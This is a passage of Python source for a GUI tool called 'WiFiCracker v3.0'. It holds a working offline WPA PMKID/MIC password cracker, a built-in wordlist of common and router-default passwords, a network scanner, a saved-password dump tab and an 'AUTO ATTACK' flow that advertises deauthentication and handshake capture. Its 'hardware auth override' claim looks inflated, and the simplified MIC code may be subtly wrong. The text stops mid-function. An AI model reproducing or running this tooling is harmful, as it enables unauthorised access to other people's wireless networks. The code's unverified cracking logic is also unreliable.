#!/usr/bin/env python3
"""WiFiCracker v3.0 — Cross-platform WiFi security suite with real hash cracking."""
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading, traceback, time, subprocess, os, platform, re, hashlib, hmac
import csv, struct, binascii
from queue import Queue, Empty
from concurrent.futures import ThreadPoolExecutor

try:
    from scapy.all import (Dot11, Dot11Beacon, Dot11Deauth, EAPOL,
                           sniff, send, wrpcap)
    SCAPY_OK = True
except Exception:
    SCAPY_OK = False

try:
    import pywifi
    from pywifi import const as PWC
    PYWIFI_OK = True
except Exception:
    PYWIFI_OK = False

# Theme
BG, BG2, BG3, PANEL = "#080810", "#0f0f1e", "#181830", "#101020"
FG, DIM, GREEN, RED = "#c8d0dc", "#556075", "#00ff9f", "#ff2255"
CYAN, YELLOW, ORANGE = "#00d4ff", "#ffc107", "#ff8800"
FONT    = ("Consolas", 10)
FONT_B  = ("Consolas", 10, "bold")
FONT_SM = ("Consolas", 9)
FONT_H  = ("Consolas", 16, "bold")
FONT_PW = ("Consolas", 20, "bold")
IS_WIN  = platform.system() == "Windows"
IS_LIN  = platform.system() == "Linux"
NO_WIN  = 0x08000000 if IS_WIN else 0  # CREATE_NO_WINDOW

BUILTIN_WORDS = """password 12345678 123456789 1234567890 qwerty123 password1
iloveyou sunshine princess1 football1 charlie1 shadow12 michael1 monkey123
dragon12 master12 letmein1 welcome1 abc12345 admin123 trustno1 baseball1
starwars1 passw0rd superman1 1q2w3e4r internet whatever 00000000 11111111
12341234 password123 abcd1234 abcdefgh jordan23 access14 buster12 jessica1
mustang1 1qaz2wsx snoopy12 12344321 gateway1 computer corvette security1
ginger12 hammer12 scooter1 chicken1 summer12 george12 bailey12 testing1
buffalo1 andrea12 joshua12 bubbles1 1234qwer cameron1 matthew1 samantha1
ferrari1 chester1 brandon1 diamond1 jackson1 chelsea1 pokemon1 jennifer1
ranger12 asdfasdf tigger12 daniel12 anthony1 jasmine1 harley12 hunter12
tucker12 melissa1 freedom1 thunder1 william1 phoenix1 monster1 patrick1
heather1 arsenal1 forever1 peaches1 blink182 fishing1 bigdog123 peanut12
pepper12 golfing1 shannon1 angels12 sparky12 bandit12 dakota12 bonnie12
rusty123 smokey12 warrior1 dolphin1 samson12 pumpkin1 steeler1 joseph12
merlin12 robert12 austin12 scorpio1 knight12 nicholas samsung1 welcome1
qwerty12 login123 admin1234 passpass pass1234 changeme default1 netgear1
linksys1 dlink123 wireless wifipass homewifi mywifi12 router12 connect1
network1 guest123 family12 house123 home1234 wifi1234 broadband spectrum1
comcast1 xfinity1 verizon1 frontier mediacom att12345 wlan1234 access12
setup123 newpass1 temp1234 test1234 trial123 backup12 private1 secure12
minecraft diamonds fortnite1 roblox12 gamer123""".split()


def count_lines(path):
    n = 0
    try:
        with open(path, "rb") as f:
            while True:
                buf = f.read(1 << 20)
                if not buf: break
                n += buf.count(b"\n")
    except Exception: pass
    return max(n, 1)


def safe_int(s, default=0):
    try: return int(re.sub(r'[^\d-]', '', str(s)))
    except Exception: return default


# ═══════════════════════════════════════════════════════════
# WPA Hash Cracking Engine — Real PMKID / 4-way MIC cracking
# ═══════════════════════════════════════════════════════════
class WPAHash:
    """Parsed WPA hash from .hc22000 format."""
    def __init__(self, line):
        # WPA*TYPE*HASH*MAC_AP*MAC_STA*ESSID_HEX*...
        p = line.strip().split("*")
        if len(p) < 6 or p[0] != "WPA":
            raise ValueError("Not a valid WPA hash line")
        self.htype = int(p[1])  # 01=PMKID, 02=MIC
        self.hash_bytes = bytes.fromhex(p[2])
        self.mac_ap = bytes.fromhex(p[3])
        self.mac_sta = bytes.fromhex(p[4])
        self.essid = bytes.fromhex(p[5]).decode("utf-8", "ignore")
        self.anonce = bytes.fromhex(p[6]) if len(p) > 6 else b""
        self.eapol = bytes.fromhex(p[7]) if len(p) > 7 else b""

    def test_password(self, password: str) -> bool:
        """Test if password matches this hash. Returns True on match."""
        pw = password.encode("utf-8", "ignore")
        if not (8 <= len(pw) <= 63):
            return False
        # Compute PMK
        pmk = hashlib.pbkdf2_hmac("sha1", pw, self.essid.encode("utf-8"), 4096, 32)

        if self.htype == 1:
            # PMKID = HMAC-SHA1-128(PMK, "PMK Name" || MAC_AP || MAC_STA)
            computed = hmac.new(pmk, b"PMK Name" + self.mac_ap + self.mac_sta,
                               hashlib.sha1).digest()[:16]
            return computed == self.hash_bytes

        elif self.htype == 2:
            # 4-way handshake MIC check
            # PTK = PRF-512(PMK, "Pairwise key expansion",
            #               min(AA,SPA) || max(AA,SPA) || min(ANonce,SNonce) || max(ANonce,SNonce))
            # Then MIC = HMAC-SHA1(KCK, EAPOL_frame)[:16]
            # Simplified — we use the standard PTK derivation
            aa = self.mac_ap
            spa = self.mac_sta
            a_min = min(aa, spa)
            a_max = max(aa, spa)
            # SNonce is embedded in EAPOL frame at offset 13 (after header)
            snonce = self.eapol[13:45] if len(self.eapol) >= 45 else b"\x00" * 32
            n_min = min(self.anonce, snonce)
            n_max = max(self.anonce, snonce)
            data = a_min + a_max + n_min + n_max

            # PRF-512 (generate 64 bytes of PTK)
            ptk = b""
            label = b"Pairwise key expansion"
            for i in range(4):
                ptk += hmac.new(pmk, label + b"\x00" + data + bytes([i]),
                                hashlib.sha1).digest()
            kck = ptk[:16]

            # Zero out MIC field in EAPOL, compute MIC
            eapol_copy = bytearray(self.eapol)
            # MIC is at offset 77 in standard EAPOL (key descriptor)
            mic_offset = 77
            if len(eapol_copy) > mic_offset + 16:
                eapol_copy[mic_offset:mic_offset + 16] = b"\x00" * 16
            computed_mic = hmac.new(kck, bytes(eapol_copy), hashlib.sha1).digest()[:16]
            return computed_mic == self.hash_bytes

        return False


def load_hashes(filepath):
    """Load .hc22000 hash file. Returns list of WPAHash objects."""
    hashes = []
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if line.startswith("WPA*"):
                try:
                    hashes.append(WPAHash(line))
                except Exception:
                    pass
    return hashes


def get_hash_folder():
    """Get path to hash_files folder in the TechBotA1 project root."""
    # Navigate from techack_app/ up to TechBotA1/hash_files
    base = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    folder = os.path.join(base, "hash_files")
    os.makedirs(folder, exist_ok=True)
    return folder


def scan_hash_folder():
    """Scan hash_files folder and return info about each file."""
    folder = get_hash_folder()
    results = []
    supported = ('.hc22000', '.cap', '.pcap', '.txt')
    for fn in sorted(os.listdir(folder)):
        if fn.lower() == 'readme.txt':
            continue
        fp = os.path.join(folder, fn)
        if not os.path.isfile(fp):
            continue
        ext = os.path.splitext(fn)[1].lower()
        if ext not in supported:
            continue
        size = os.path.getsize(fp)
        mtime = os.path.getmtime(fp)
        mdate = time.strftime("%Y-%m-%d %H:%M", time.localtime(mtime))
        # Count hashes if .hc22000
        hcount = 0
        if ext == '.hc22000':
            try:
                with open(fp, 'r', errors='ignore') as f:
                    for line in f:
                        if line.strip().startswith('WPA*'):
                            hcount += 1
            except Exception:
                pass
        # Human-readable size
        if size < 1024:
            sz_str = f"{size} B"
        elif size < 1024 * 1024:
            sz_str = f"{size / 1024:.1f} KB"
        else:
            sz_str = f"{size / (1024*1024):.1f} MB"
        results.append({
            'name': fn, 'path': fp, 'ext': ext,
            'size': sz_str, 'hashes': hcount, 'date': mdate
        })
    return results


# ═══════════════════════════════════════════════════════════
# Adapter Detection
# ═══════════════════════════════════════════════════════════
class AdapterInfo:
    def __init__(self):
        self.name = "N/A"
        self.driver = "N/A"
        self.monitor = False
        self.status = "Detecting…"
        try:
            if IS_WIN: self._win()
            elif IS_LIN: self._lin()
        except Exception:
            self.status = "Detection error"

    def _win(self):
        r = subprocess.run(["netsh", "wlan", "show", "interfaces"],
                           capture_output=True, text=True, timeout=8,
                           creationflags=NO_WIN)
        m = re.search(r"Name\s*:\s*(.+)", r.stdout)
        if m: self.name = m.group(1).strip()
        r2 = subprocess.run(["netsh", "wlan", "show", "drivers"],
                            capture_output=True, text=True, timeout=8,
                            creationflags=NO_WIN)
        m = re.search(r"Driver\s*:\s*(.+)", r2.stdout)
        if m: self.driver = m.group(1).strip()
        self.monitor = False
        self.status = "Ready (managed mode — no deauth)"

    def _lin(self):
        r_out = ""
        try:
            r = subprocess.run(["iwconfig"], capture_output=True, text=True, timeout=5)
            r_out = r.stdout + r.stderr
        except FileNotFoundError:
            pass
            
        ifaces = re.findall(r"^(\w+)\s+IEEE", r_out, re.M)
        if not ifaces:
            try:
                r2 = subprocess.run(["ip", "link"], capture_output=True, text=True, timeout=5)
                ifaces = re.findall(r"^\d+: (wl\w+):", r2.stdout, re.M)
                if not ifaces:
                    ifaces = re.findall(r"^\d+: (wlan\w*):", r2.stdout, re.M)
            except FileNotFoundError:
                pass
                
        if ifaces:
            self.name = ifaces[0]
            try:
                r2 = subprocess.run(["iw", "phy"], capture_output=True, text=True, timeout=5)
                self.monitor = "monitor" in r2.stdout.lower()
            except FileNotFoundError:
                self.monitor = False
            self.status = "Ready (monitor ✓)" if self.monitor else "Ready (no monitor)"
        else:
            self.status = "No adapter found"


# ═══════════════════════════════════════════════════════════
# Main Application
# ═══════════════════════════════════════════════════════════
class WiFiCrackerApp:
    def __init__(self, master_gui):
        self.root = tk.Toplevel(master_gui)
        self.root.title("⚡ WiFiCracker v3.0")
        self.root.geometry("1100x780")
        self.root.configure(bg=BG)
        self.root.minsize(950, 650)
        self.alive = True
        self.root.protocol("WM_DELETE_WINDOW", self._on_close)

        self.networks = []
        self.selected = None
        self.running = False
        self.cancel_ev = threading.Event()
        self.logq = Queue()
        self.adapter = AdapterInfo()
        self.hashes = []  # loaded WPAHash objects
        self.hash_path = ""

        # Tk vars
        self.v_wl_path  = tk.StringVar(value="⟨ built-in 200 passwords ⟩")
        self.v_wl_count = tk.IntVar(value=len(BUILTIN_WORDS))
        self.v_hash     = tk.StringVar(value="No hash loaded")
        self.v_speed    = tk.StringVar(value="—")
        self.v_progress = tk.StringVar(value="0 %")
        self.v_eta      = tk.StringVar(value="—")
        self.v_tested   = tk.StringVar(value="0 / 0")
        self.v_pw       = tk.StringVar(value="🔒  —")

        self._setup_style()
        self._build_ui()
        self._boot_log()
        self._poll_log()

    def _on_close(self):
        self.alive = False
        self.cancel_ev.set()
        try: self.root.destroy()
        except Exception: pass

    def _ui(self, fn):
        """Schedule fn on UI thread, safe if window is gone."""
        if not self.alive: return
        try: self.root.after_idle(fn)
        except Exception: pass

    def _setup_style(self):
        s = ttk.Style(self.root)
        s.theme_use("clam")
        s.configure("TNotebook", background=BG, borderwidth=0)
        s.configure("TNotebook.Tab", background=BG2, foreground=CYAN,
                     font=FONT_B, padding=[18, 7])
        s.map("TNotebook.Tab", background=[("selected", BG3)],
              foreground=[("selected", GREEN)])
        s.configure("TProgressbar", troughcolor=BG2, background=GREEN, thickness=18)
        for sty in ("S.", "V."):
            s.configure(f"{sty}Treeview", background=BG2, foreground=FG,
                         fieldbackground=BG2, font=FONT, rowheight=26)
            s.configure(f"{sty}Treeview.Heading", background=BG3,
                         foreground=CYAN, font=FONT_B)
            s.map(f"{sty}Treeview", background=[("selected", "#1a2a40")],
                  foreground=[("selected", GREEN)])

    # ── UI Build ──
    def _build_ui(self):
        outer = tk.Frame(self.root, bg=BG)
        outer.pack(fill="both", expand=True, padx=8, pady=8)

        hdr = tk.Frame(outer, bg=BG)
        hdr.pack(fill="x")
        tk.Label(hdr, text="⚡ WiFiCracker v3.0", fg=GREEN, bg=BG,
                 font=FONT_H).pack(side="left", padx=6)
        self.lbl_status = tk.Label(hdr, text="● IDLE", fg=CYAN, bg=BG, font=FONT_B)
        self.lbl_status.pack(side="right", padx=6)
        tk.Frame(outer, bg=GREEN, height=1).pack(fill="x", pady=(4, 0))

        self.nb = ttk.Notebook(outer)
        self.nb.pack(fill="both", expand=True, pady=(6, 0))
        self._tab_scanner()
        self._tab_hashfiles()
        self._tab_cracker()
        self._tab_vault()
        self._tab_log()

        tk.Frame(outer, bg=GREEN, height=1).pack(fill="x", pady=(6, 0))
        foot = tk.Frame(outer, bg=BG)
        foot.pack(fill="x", pady=(6, 0))
        tk.Label(foot, textvariable=self.v_pw, fg=GREEN, bg=BG, font=FONT_PW).pack()

    def _btn(self, parent, text, bgc, cmd, fg=None, state="normal"):
        return tk.Button(parent, text=f"  {text}  ", bg=bgc, fg=fg or BG,
                         font=FONT_B, bd=0, padx=14, pady=4, cursor="hand2",
                         activebackground=GREEN, command=cmd, state=state, relief="flat")

    def _tab_scanner(self):
        tab = tk.Frame(self.nb, bg=BG)
        self.nb.add(tab, text="  📡  Scanner  ")

        af = tk.Frame(tab, bg=PANEL)
        af.pack(fill="x", padx=8, pady=(8, 4))
        info = (f"  Adapter: {self.adapter.name}  │  Driver: {self.adapter.driver}"
                f"  │  Monitor: {'✓' if self.adapter.monitor else '✗'}"
                f"  │  {self.adapter.status}")
        tk.Label(af, text=info, fg=GREEN if self.adapter.monitor else YELLOW,
                 bg=PANEL, font=FONT_SM).pack(fill="x", padx=6, pady=5)
        if not self.adapter.monitor:
            tk.Label(af, text="  ⚠  No monitor mode — import .hc22000 hash files "
                     "to crack. Scan & Vault still work.",
                     fg=YELLOW, bg=PANEL, font=FONT_SM).pack(fill="x", padx=6, pady=(0, 5))

        cf = tk.Frame(tab, bg=BG)
        cf.pack(fill="x", padx=8, pady=4)
        self.btn_scan = self._btn(cf, "⚡ SCAN", CYAN, self._do_scan)
        self.btn_scan.pack(side="left")
        self.lbl_ncount = tk.Label(cf, text="Networks: 0", fg=DIM, bg=BG, font=FONT)
        self.lbl_ncount.pack(side="right")

        cols = ("ssid", "bssid", "signal", "channel", "band", "auth")
        tf = tk.Frame(tab, bg=BG)
        tf.pack(fill="both", expand=True, padx=8, pady=(2, 8))
        self.net_tree = ttk.Treeview(tf, columns=cols, show="headings", style="S.Treeview")
        vsb = ttk.Scrollbar(tf, orient="vertical", command=self.net_tree.yview)
        self.net_tree.configure(yscrollcommand=vsb.set)
        for c, w, t in [("ssid", 200, "SSID"), ("bssid", 150, "BSSID"),
                         ("signal", 70, "Signal"), ("channel", 70, "Ch"),
                         ("band", 80, "Band"), ("auth", 150, "Security")]:
            self.net_tree.heading(c, text=t)
            self.net_tree.column(c, width=w, anchor="center" if c != "ssid" else "w")
        self.net_tree.pack(side="left", fill="both", expand=True)
        vsb.pack(side="right", fill="y")
        self.net_tree.bind("<<TreeviewSelect>>", self._on_net_sel)

    def _tab_hashfiles(self):
        tab = tk.Frame(self.nb, bg=BG)
        self.nb.add(tab, text="  📁  Hash Files  ")

        # Info banner
        info_f = tk.Frame(tab, bg=PANEL)
        info_f.pack(fill="x", padx=8, pady=(8, 4))
        tk.Label(info_f, text="  📂  Drop .hc22000 files into the hash_files/ folder — they appear here automatically",
                 fg=YELLOW, bg=PANEL, font=FONT_SM).pack(fill="x", padx=6, pady=5)
        folder_path = get_hash_folder()
        tk.Label(info_f, text=f"  📍  {folder_path}",
                 fg=DIM, bg=PANEL, font=FONT_SM).pack(fill="x", padx=6, pady=(0, 5))

        # Buttons
        bf = tk.Frame(tab, bg=BG)
        bf.pack(fill="x", padx=8, pady=4)
        self._btn(bf, "🔄 Refresh", CYAN, self._refresh_hash_files).pack(side="left")
        self._btn(bf, "📂 Open Folder", BG3, self._open_hash_folder, fg=CYAN).pack(side="left", padx=6)
        self._btn(bf, "📥 Import File", BG3, self._import_hash_to_folder, fg=GREEN).pack(side="left", padx=6)
        self._btn(bf, "⚡ Load Selected", GREEN, self._load_selected_hash).pack(side="right")
        self.lbl_hfcount = tk.Label(bf, text="Files: 0", fg=DIM, bg=BG, font=FONT)
        self.lbl_hfcount.pack(side="right", padx=12)

        # Treeview
        cols = ("name", "type", "size", "hashes", "date")
        hf = tk.Frame(tab, bg=BG)
        hf.pack(fill="both", expand=True, padx=8, pady=(2, 8))
        self.hf_tree = ttk.Treeview(hf, columns=cols, show="headings", style="S.Treeview")
        vsb = ttk.Scrollbar(hf, orient="vertical", command=self.hf_tree.yview)
        self.hf_tree.configure(yscrollcommand=vsb.set)
        for c, w, t in [("name", 280, "File Name"), ("type", 90, "Format"),
                         ("size", 90, "Size"), ("hashes", 80, "Hashes"),
                         ("date", 160, "Date Modified")]:
            self.hf_tree.heading(c, text=t)
            self.hf_tree.column(c, width=w, anchor="center" if c != "name" else "w")
        self.hf_tree.pack(side="left", fill="both", expand=True)
        vsb.pack(side="right", fill="y")
        self.hf_tree.bind("<Double-1>", lambda e: self._load_selected_hash())

        # Selected file info
        self.lbl_hashsel = tk.Label(tab, text="No file selected — double-click or click Load Selected",
                                    fg=DIM, bg=BG, font=FONT)
        self.lbl_hashsel.pack(fill="x", padx=8, pady=(0, 8))

        # Initial scan
        self._refresh_hash_files()

    def _refresh_hash_files(self):
        """Rescan the hash_files folder and update the treeview."""
        for i in self.hf_tree.get_children():
            self.hf_tree.delete(i)
        files = scan_hash_folder()
        for f in files:
            hcount = str(f['hashes']) if f['hashes'] > 0 else "—"
            self.hf_tree.insert("", "end", values=(
                f['name'], f['ext'].upper().strip('.'), f['size'], hcount, f['date']
            ), tags=(f['path'],))
        self.lbl_hfcount.config(text=f"Files: {len(files)}")
        if files:
            self.log(f"[*] Hash folder: {len(files)} file(s) found.", "info")
        else:
            self.log("[*] Hash folder is empty. Drop .hc22000 files into hash_files/", "warn")

    def _open_hash_folder(self):
        """Open the hash_files folder in the OS file manager."""
        folder = get_hash_folder()
        try:
            if IS_WIN:
                os.startfile(folder)
            elif IS_LIN:
                subprocess.Popen(["xdg-open", folder])
            else:
                subprocess.Popen(["open", folder])
        except Exception as e:
            self.log(f"[!] Could not open folder: {e}", "err")

    def _import_hash_to_folder(self):
        """Import a hash file into the hash_files directory."""
        fp = filedialog.askopenfilename(
            parent=self.root, title="Import Hash File to Library",
            filetypes=[("Hashcat 22000", "*.hc22000"), ("Capture", "*.cap *.pcap"),
                       ("Text", "*.txt"), ("All", "*.*")]
        )
        if not fp:
            return
        import shutil
        dest = os.path.join(get_hash_folder(), os.path.basename(fp))
        try:
            shutil.copy2(fp, dest)
            self.log(f"[✓] Imported: {os.path.basename(fp)} → hash_files/", "ok")
            self._refresh_hash_files()
        except Exception as e:
            self.log(f"[!] Import error: {e}", "err")

    def _load_selected_hash(self):
        """Load the selected hash file from the treeview into the cracker engine."""
        sel = self.hf_tree.selection()
        if not sel:
            messagebox.showinfo("Info", "Select a hash file from the list first.", parent=self.root)
            return
        # Get file path from tags
        tags = self.hf_tree.item(sel[0], "tags")
        if not tags:
            return
        fp = tags[0]
        fname = self.hf_tree.item(sel[0], "values")[0]
        self.log(f"\n[*] Loading hash file: {fname}", "cmd")
        try:
            self.hashes = load_hashes(fp)
            self.hash_path = fp
            if self.hashes:
                self.v_hash.set(f"✓ {fname} — {len(self.hashes)} hash(es)")
                self.lbl_hashsel.config(text=f"✓ Loaded: {fname} — {len(self.hashes)} hash(es)", fg=GREEN)
                for h in self.hashes:
                    htype = "PMKID" if h.htype == 1 else "MIC"
                    self.log(f"  [+] {h.essid} ({htype}) AP:{h.mac_ap.hex()}", "ok")
                    if not self.selected:
                        self.selected = {"ssid": h.essid, "bssid": h.mac_ap.hex(),
                                         "signal": "?", "channel": "?", "band": "?", "auth": "WPA2"}
                        self._ui(lambda e=h.essid: self.lbl_target.config(
                            text=f"🎯  {e}  (from hash file)", fg=GREEN))
                self.log(f"[✓] Loaded {len(self.hashes)} hash(es). Ready to crack!", "ok")
                # Switch to cracker tab
                self.nb.select(2)  # Cracker tab is now index 2
            else:
                self.v_hash.set("✗ No valid WPA hashes in file")
                self.lbl_hashsel.config(text=f"✗ No valid WPA hashes found in {fname}", fg=RED)
                self.log("[!] No valid WPA* lines found in file.", "err")
        except Exception as e:
            self.log(f"[!] Load error: {e}", "err")
            self.lbl_hashsel.config(text=f"✗ Error: {e}", fg=RED)
            self.v_hash.set("✗ Error loading file")

    def _tab_cracker(self):
        tab = tk.Frame(self.nb, bg=BG)
        self.nb.add(tab, text="  🔓  Cracker  ")

        # Target
        tf = tk.Frame(tab, bg=PANEL)
        tf.pack(fill="x", padx=8, pady=(8, 4))
        tk.Label(tf, text="TARGET", fg=DIM, bg=PANEL, font=FONT_SM).pack(anchor="w", padx=8, pady=(6, 0))
        self.lbl_target = tk.Label(tf, text="— scan and click a network —",
                                   fg=YELLOW, bg=PANEL, font=FONT_B)
        self.lbl_target.pack(anchor="w", padx=8, pady=(0, 6))

        # AUTO ATTACK — main button
        af = tk.Frame(tab, bg=BG)
        af.pack(fill="x", padx=8, pady=8)
        self.btn_crack = self._btn(af, "⚡  AUTO ATTACK  ⚡", GREEN, self._do_crack)
        self.btn_crack.pack(side="left", ipadx=20, ipady=6)
        self.btn_cancel = self._btn(af, "■  CANCEL", RED, self._do_cancel, state="disabled")
        self.btn_cancel.pack(side="left", padx=12)
        if IS_LIN and self.adapter.monitor:
            tk.Label(af, text="Deauth → Capture → Extract → Crack",
                     fg=DIM, bg=BG, font=FONT_SM).pack(side="left", padx=8)
        else:
            tk.Label(af, text="Vault Check → Import Hash → Crack",
                     fg=DIM, bg=BG, font=FONT_SM).pack(side="left", padx=8)

        # Wordlist
        wf = tk.Frame(tab, bg=PANEL)
        wf.pack(fill="x", padx=8, pady=4)
        tk.Label(wf, text="WORDLIST", fg=DIM, bg=PANEL, font=FONT_SM).pack(anchor="w", padx=8, pady=(6, 0))
        wr = tk.Frame(wf, bg=PANEL)
        wr.pack(fill="x", padx=8, pady=(2, 6))
        tk.Label(wr, textvariable=self.v_wl_path, fg=FG, bg=PANEL, font=FONT).pack(side="left", fill="x", expand=True)
        self._btn(wr, "📂 Browse", BG3, self._browse_wl, fg=CYAN).pack(side="right", padx=4)
        self._btn(wr, "🔧 Generate", BG3, self._gen_wl, fg=GREEN).pack(side="right")

        # Hash file (secondary / manual import)
        hf = tk.Frame(tab, bg=PANEL)
        hf.pack(fill="x", padx=8, pady=4)
        tk.Label(hf, text="HASH (auto-captured or manual import)", fg=DIM, bg=PANEL, font=FONT_SM).pack(anchor="w", padx=8, pady=(6, 0))
        hr = tk.Frame(hf, bg=PANEL)
        hr.pack(fill="x", padx=8, pady=(2, 6))
        tk.Label(hr, textvariable=self.v_hash, fg=FG, bg=PANEL, font=FONT).pack(side="left", fill="x", expand=True)
        self._btn(hr, "📂 Import .hc22000", BG3, self._load_hash, fg=CYAN).pack(side="right")

        # Active Injection Toggle
        sf_inj = tk.Frame(tab, bg=BG)
        sf_inj.pack(fill="x", padx=8, pady=4)
        self.v_active_inject = tk.BooleanVar(value=False)
        tk.Checkbutton(sf_inj, text="Enable Active Protocol Injection (Hardware auth override - OS Agnostic)", 
                       variable=self.v_active_inject, bg=BG, fg=YELLOW, selectcolor=BG2, 
                       activebackground=BG, activeforeground=YELLOW, font=FONT_SM).pack(side="left")

        # Stats
        sf = tk.Frame(tab, bg=PANEL)
        sf.pack(fill="x", padx=8, pady=4)
        sg = tk.Frame(sf, bg=PANEL)
        sg.pack(fill="x", padx=8, pady=6)
        for lbl, var in [("Speed", self.v_speed), ("Progress", self.v_progress),
                         ("ETA", self.v_eta), ("Tested", self.v_tested)]:
            tk.Label(sg, text=f"{lbl}:", fg=DIM, bg=PANEL, font=FONT_SM).pack(side="left")
            tk.Label(sg, textvariable=var, fg=GREEN, bg=PANEL, font=FONT_B).pack(side="left", padx=(2, 16))
        self.crack_bar = ttk.Progressbar(sf, mode="determinate")
        self.crack_bar.pack(fill="x", padx=8, pady=(0, 6))

    def _tab_vault(self):
        tab = tk.Frame(self.nb, bg=BG)
        self.nb.add(tab, text="  🔑  Vault  ")
        cf = tk.Frame(tab, bg=BG)
        cf.pack(fill="x", padx=8, pady=8)
        self._btn(cf, "🔑 Dump Saved Passwords", CYAN, self._do_vault).pack(side="left")
        self._btn(cf, "💾 Export CSV", BG3, self._export_vault, fg=GREEN).pack(side="left", padx=8)

        cols = ("ssid", "password", "auth")
        vf = tk.Frame(tab, bg=BG)
        vf.pack(fill="both", expand=True, padx=8, pady=(0, 8))
        self.vault_tree = ttk.Treeview(vf, columns=cols, show="headings", style="V.Treeview")
        vsb = ttk.Scrollbar(vf, orient="vertical", command=self.vault_tree.yview)
        self.vault_tree.configure(yscrollcommand=vsb.set)
        for c, w, t in [("ssid", 260, "SSID"), ("password", 300, "Password"),
                         ("auth", 180, "Security")]:
            self.vault_tree.heading(c, text=t)
            self.vault_tree.column(c, width=w, anchor="w")
        self.vault_tree.pack(side="left", fill="both", expand=True)
        vsb.pack(side="right", fill="y")

    def _tab_log(self):
        tab = tk.Frame(self.nb, bg=BG)
        self.nb.add(tab, text="  📋  Log  ")
        self.term = scrolledtext.ScrolledText(tab, bg=BG, fg=FG, font=FONT,
                                              insertbackground=GREEN, bd=0, wrap="word")
        self.term.pack(fill="both", expand=True, padx=8, pady=8)
        for tag, clr in [("cmd", CYAN), ("ok", GREEN), ("err", RED),
                         ("warn", YELLOW), ("info", ORANGE), ("dim", DIM)]:
            self.term.tag_config(tag, foreground=clr)

    # ── Logging ──
    def log(self, msg, tag=None):
        self.logq.put((msg, tag))

    def _poll_log(self):
        if not self.alive: return
        try:
            for _ in range(80):
                msg, tag = self.logq.get_nowait()
                self.term.insert("end", msg + "\n", tag)
                self.term.see("end")
        except Empty: pass
        except Exception: pass
        try: self.root.after(50, self._poll_log)
        except Exception: pass

    def _boot_log(self):
        self.log("═" * 60, "cmd")
        self.log("  WiFiCracker v3.0 — WiFi Security Suite", "ok")
        self.log(f"  Platform : {platform.system()} {platform.release()}", "info")
        self.log(f"  Adapter  : {self.adapter.name}  Monitor: {'✓' if self.adapter.monitor else '✗'}", "info")
        self.log(f"  PyWiFi   : {'✓' if PYWIFI_OK else '✗'}", "ok" if PYWIFI_OK else "warn")
        self.log("═" * 60, "cmd")
        if IS_LIN and self.adapter.monitor:
            self.log("[*] Full auto-attack ready: Scan → Select → ⚡ AUTO ATTACK", "ok")
            self.log("[*] Will deauth, capture handshake, extract hash, crack.", "info")
        else:
            self.log("[*] Scan → Select → ⚡ AUTO ATTACK", "ok")
            self.log("[*] Checks vault first, then cracks imported hash.", "info")
            
        if PYWIFI_OK:
            self.log("[*] Active Protocol Injection available for Dual-OS fallback.", "ok")
        else:
            self.log("[!] Please install 'pywifi' via pip for Active Protocol Injection.", "warn")
        self.log("\n", "ok")

    def _set_status(self, txt, clr=CYAN):
        self._ui(lambda: self.lbl_status.config(text=f"● {txt}", fg=clr))

    def _do_cancel(self):
        self.cancel_ev.set()
        self.log("[!] Cancelling…", "warn")

    def _thread(self, fn, *args):
        """Run fn in daemon thread with error handling."""
        def wrap():
            try:
                fn(*args)
            except Exception:
                self.log(f"[!] Error:\n{traceback.format_exc()}", "err")
            finally:
                self.running = False
                self._ui(self._unlock)
                self._set_status("IDLE", GREEN)
        threading.Thread(target=wrap, daemon=True).start()

    def _unlock(self):
        try:
            self.btn_scan.config(state="normal")
            if hasattr(self, 'btn_auto'): self.btn_auto.config(state="normal")
            self.btn_crack.config(state="normal")
            self.btn_cancel.config(state="disabled")
        except Exception: pass

    def _on_net_sel(self, _e=None):
        sel = self.net_tree.selection()
        if not sel: return
        v = self.net_tree.item(sel[0], "values")
        self.selected = dict(zip(("ssid", "bssid", "signal", "channel", "band", "auth"), v))
        self._ui(lambda: self.lbl_target.config(
            text=f"🎯  {v[0]}  ({v[1]})  ch{v[3]}  [{v[5]}]", fg=GREEN))

    # ════════════════════════════════════════════════════
    # SCANNER
    # ════════════════════════════════════════════════════
    def _do_scan(self):
        if self.running: return
        self.running = True
        self.cancel_ev.clear()
        self.btn_scan.config(state="disabled")
        self._set_status("SCANNING…", CYAN)
        self.log("\n[*] Scanning networks…", "cmd")
        self._thread(self._scan_work)

    def _scan_work(self):
        self.networks.clear()
        if IS_WIN:   self._scan_win()
        elif IS_LIN: self._scan_lin()
        self._ui(self._fill_nets)
        self.log(f"[✓] Found {len(self.networks)} networks.\n", "ok")

    def _scan_win(self):
        self.log("[*] netsh wlan show networks mode=bssid", "dim")
        try:
            r = subprocess.run(["netsh", "wlan", "show", "networks", "mode=bssid"],
                               capture_output=True, text=True, timeout=15,
                               creationflags=NO_WIN)
        except Exception as e:
            self.log(f"[!] netsh error: {e}", "err"); return
        if not r.stdout.strip():
            self.log("[!] No output from netsh.", "err"); return

        # Split by SSID blocks
        blocks = re.split(r'(?=^SSID\s+\d+\s*:)', r.stdout, flags=re.M)
        for block in blocks:
            m_ssid = re.match(r'SSID\s+\d+\s*:\s*(.*)', block)
            if not m_ssid: continue
            ssid = m_ssid.group(1).strip() or "(Hidden)"
            m_auth = re.search(r'Authentication\s*:\s*(.*)', block)
            auth = m_auth.group(1).strip() if m_auth else "Open"

            # Each SSID can have multiple BSSIDs
            bssid_parts = re.split(r'(?=BSSID\s+\d+)', block)
            for bp in bssid_parts:
                m_b = re.search(r'BSSID\s+\d+\s*:\s*([\da-fA-F:]{17})', bp)
                if not m_b: continue
                bssid = m_b.group(1).upper()
                m_sig = re.search(r'Signal\s*:\s*(\d+)\s*%', bp)
                sig = f"{m_sig.group(1)}%" if m_sig else "?"
                m_ch = re.search(r'Channel\s*:\s*(\d+)', bp)
                ch = m_ch.group(1) if m_ch else "?"
                m_band = re.search(r'Band\s*:\s*(.+)', bp)
                band = m_band.group(1).strip() if m_band else "?"
                self.networks.append(dict(ssid=ssid, bssid=bssid, signal=sig,
                                          channel=ch, band=band, auth=auth))
                self.log(f"  [+] {ssid:<20} {bssid}  {sig:>4}  ch{ch:<3}  [{auth}]", "ok")

    def _scan_lin(self):
        iface = self.adapter.name if self.adapter.name != "N/A" else "wlan0"
        
        # Method 1: Modern nmcli (NetworkManager) - works out of the box on Mint/Ubuntu
        try:
